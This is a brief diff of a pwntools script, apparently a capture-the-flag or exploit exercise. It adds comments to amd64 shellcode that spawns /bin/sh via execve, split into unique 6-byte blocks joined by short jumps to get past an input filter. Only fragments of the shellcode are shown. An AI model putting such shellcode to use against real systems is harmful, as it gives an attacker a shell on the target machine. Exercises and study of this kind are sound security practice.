@@ -6,6 +6,7 @@ from pwn import *
 
 context.arch = "amd64"
 
+# based off shellcraft.amd64.linux.execve(path='/bin/sh')
 sc = '''
     push 0x68732f6e
     pop rax
@@ -58,6 +59,7 @@ SC = [
 D = dict(zip(SC, [SC.count(x) for x in SC]))
 assert (max(D.values()) == 1)
 
+# short jmp rel8: https://www.felixcloutier.com/x86/jmp
 jmp = b'\xeb'
 
 # add jumps after each 6 byte block
